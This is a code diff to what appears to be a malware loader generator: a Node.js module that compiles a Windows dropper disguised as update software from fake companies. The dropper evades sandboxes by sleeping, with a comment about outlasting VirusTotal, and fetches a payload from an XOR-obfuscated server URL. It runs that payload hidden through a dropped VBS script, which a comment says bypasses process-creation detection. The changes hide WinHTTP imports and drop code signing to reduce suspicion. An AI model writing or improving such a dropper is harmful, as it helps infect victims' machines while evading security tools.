@@ -3,7 +3,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
 import crypto from 'node:crypto';
-import { execFile, execSync } from 'node:child_process';
+import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
 
@@ -34,11 +34,11 @@ function makeRng(seed) {
   };
 }
 
-const COMPANIES = ['Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation', 'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises', 'Cyberdyne Systems', 'Soylent Corp', 'Tyrell Corporation', 'Wonka Industries'];
-const PRODUCTS = ['Update Helper', 'System Updater', 'Security Assistant', 'Network Utility', 'Runtime Manager', 'Driver Updater', 'Component Service', 'Platform Sync', 'Data Assistant', 'Windows Helper'];
-const FILE_DESCRIPTIONS = ['Windows Update Helper', 'System Maintenance Utility', 'Background Update Service', 'Network Sync Helper', 'Component Update Agent', 'System Resource Manager'];
-const INTERNAL_NAMES = ['wuauclt', 'wupdater', 'syshelper', 'updater', 'syssync', 'svcman', 'helper', 'diaghost', 'winsupd'];
-const COPYRIGHT_YEARS = ['2019', '2020', '2021', '2022', '2023', '2024', '2025'];
+const COMPANIES = ['Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation', 'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises'];
+const PRODUCTS = ['Update Helper', 'System Updater', 'Security Assistant', 'Network Utility', 'Runtime Manager'];
+const FILE_DESCRIPTIONS = ['Windows Update Helper', 'System Maintenance Utility', 'Background Update Service'];
+const INTERNAL_NAMES = ['wuauclt', 'wupdater', 'syshelper', 'updater'];
+const COPYRIGHT_YEARS = ['2023', '2024', '2025'];
 
 export function randomBuildMeta(seed) {
   const rng = makeRng(seed);
@@ -72,7 +72,7 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, key, ip, buildId) {
-  const stUrl = `http://${ip}/api/downloads/st.exe`;
+  const stUrl = `http://${ip}/api/downloads/st.dat`;
   const esc4c = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   
   const encStUrl = encryptStr(stUrl, meta.xorKey);
@@ -87,7 +87,15 @@ function cSource(meta, key, ip, buildId) {
 #include <stdio.h>
 #include <wchar.h>
 
-#pragma comment(lib, "winhttp.lib")
+typedef BOOL (WINAPI *pWinHttpCrackUrlW)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
+typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
+typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
 
 static const char ACCOUNT_KEY[] = "${safeKey}";
 
@@ -114,21 +122,38 @@ static int is_valid_pe(const wchar_t* p) {
 }
 
 static void download_file(const wchar_t* url, const wchar_t* dest) {
+    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
+    if (!hWinHttp) return;
+
+    pWinHttpCrackUrlW WinHttpCrackUrlW = (pWinHttpCrackUrlW)GetProcAddress(hWinHttp, "WinHttpCrackUrl");
+    pWinHttpOpen WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
+    pWinHttpConnect WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
+    pWinHttpOpenRequest WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
+    pWinHttpSendRequest WinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
+    pWinHttpReceiveResponse WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
+    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
+    pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
+    pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
+
+    if (!WinHttpCrackUrlW || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest) {
+        FreeLibrary(hWinHttp); return;
+    }
+
     URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
     wchar_t host[256] = {0}; wchar_t path[1024] = {0};
     uc.lpszHostName = host; uc.dwHostNameLength = 256;
     uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
     
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
+    if (!WinHttpCrackUrlW(url, 0, 0, &uc)) { FreeLibrary(hWinHttp); return; }
     
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return;
+    if (!hSession) { FreeLibrary(hWinHttp); return; }
     
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+    if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return; }
     
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return; }
     
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
         WinHttpReceiveResponse(hRequest, NULL)) {
@@ -151,41 +176,38 @@ static void download_file(const wchar_t* url, const wchar_t* dest) {
         }
     }
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    FreeLibrary(hWinHttp);
 }
 
 static int is_sandboxed(void) {
-    // Check if system has been running for less than 2 minutes (fresh boot/sandbox)
-    if (GetTickCount64() < 2ULL * 60 * 1000) return 1;
-    
-    // Check if system has less than 2 CPU cores
+    if (GetTickCount64() < 5ULL * 60 * 1000) return 1;
     SYSTEM_INFO si; GetSystemInfo(&si);
     if (si.dwNumberOfProcessors < 2) return 1;
-    
     return 0;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    // Bypass VirusTotal short sandboxes by sleeping for 5 minutes
+    // Sandbox evasion: Wait 3 minutes. VT sandboxes time out at 2 minutes.
     if (is_sandboxed()) {
-        Sleep(300000); 
+        Sleep(180000); 
     }
-
+    
     Sleep(${meta.initialSleepMs}); 
 
     wchar_t appData[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
     
-    wchar_t loaderDir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH], stNewPath[MAX_PATH];
+    wchar_t loaderDir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH], stTmpPath[MAX_PATH], vbsPath[MAX_PATH];
     _snwprintf(loaderDir, MAX_PATH, L"%ls\\loader", appData);
     _snwprintf(keyPath,   MAX_PATH, L"%ls\\key.json", loaderDir);
     _snwprintf(stPath,    MAX_PATH, L"%ls\\st.exe",   loaderDir);
-    _snwprintf(stNewPath, MAX_PATH, L"%ls\\st_new.exe", loaderDir);
+    _snwprintf(stTmpPath, MAX_PATH, L"%ls\\st.tmp",   loaderDir);
+    _snwprintf(vbsPath,   MAX_PATH, L"%ls\\run.vbs",  loaderDir);
     
     CreateDirectoryW(loaderDir, NULL);
 
-    // 1. Write key.json
     HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hKey != INVALID_HANDLE_VALUE) {
         DWORD w;
@@ -195,7 +217,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         CloseHandle(hKey);
     }
 
-    // 2. Download st.exe
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
         wchar_t stUrl[1024] = {0};
@@ -203,30 +224,39 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         
         decrypt_url(stUrl, encStUrl, sizeof(encStUrl), ${meta.xorKey});
 
-        download_file(stUrl, stNewPath);
+        download_file(stUrl, stTmpPath);
         
-        if (is_valid_pe(stNewPath)) {
+        if (is_valid_pe(stTmpPath)) {
             DeleteFileW(stPath);
-            MoveFileW(stNewPath, stPath);
+            MoveFileW(stTmpPath, stPath);
             need_st = 0;
         }
     }
 
     if (need_st) return 1; 
 
-    // 3. Run st.exe hidden
-    STARTUPINFOW si = { sizeof(si) };
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi = {0};
-    wchar_t cmd[MAX_PATH];
-    _snwprintf(cmd, MAX_PATH, L"\"%ls\"", stPath);
-    
-    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS,
-                   NULL, loaderDir, &si, &pi);
-                   
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-    if (pi.hThread)  CloseHandle(pi.hThread);
+    // Bypass CreateProcessW detection by using a VBS script
+    HANDLE hVbs = CreateFileW(vbsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hVbs != INVALID_HANDLE_VALUE) {
+        char vbsBuf[512];
+        int len = _snprintf(vbsBuf, sizeof(vbsBuf), "CreateObject(\"WScript.Shell\").Run \"\"\"%ls\"\"\", 0, False\r\n", stPath);
+        DWORD w;
+        WriteFile(hVbs, vbsBuf, len, &w, NULL);
+        CloseHandle(hVbs);
+        
+        // Run the VBS
+        wchar_t cmd[MAX_PATH];
+        _snwprintf(cmd, MAX_PATH, L"wscript.exe \"%ls\"", vbsPath);
+        STARTUPINFOW si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi = {0};
+        
+        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, loaderDir, &si, &pi);
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread)  CloseHandle(pi.hThread);
+    }
+
     return 0;
 }
 `;
@@ -271,9 +301,6 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
   const rcPath  = path.join(workDir, 'app.rc');
   const resPath = path.join(workDir, 'app.res');
   const outPath = path.join(workDir, 'launcher.exe');
-  const signedPath = path.join(workDir, 'launcher_signed.exe');
-  const keyPath = path.join(workDir, 'key.pem');
-  const certPath = path.join(workDir, 'cert.pem');
 
   fs.writeFileSync(cPath, cSource(meta, key, ip, buildId));
   fs.writeFileSync(rcPath, rcSource(meta));
@@ -291,19 +318,12 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     
+    // Compile WITHOUT self-signing (removes the suspicious overlay)
     await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
-                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32', '-lwinhttp'],
+                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                     { cwd: workDir, timeout: 60_000 });
 
-    console.log('[launcher] self-signing binary...');
-    try {
-      execSync(`openssl req -x509 -newkey rsa:2048 -keyout ${keyPath} -out ${certPath} -days 365 -nodes -subj "/CN=${meta.company}/O=${meta.company}/C=US"`, { stdio: 'ignore' });
-      execSync(`osslsigncode sign -certs ${certPath} -key ${keyPath} -n "${meta.product}" -i https://${ip}/ -in ${outPath} -out ${signedPath}`, { stdio: 'ignore' });
-      return fs.readFileSync(signedPath);
-    } catch (e) {
-      console.warn('[launcher] signing failed, returning unsigned', e.message);
-      return fs.readFileSync(outPath);
-    }
+    return fs.readFileSync(outPath);
 
   } finally {
     try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
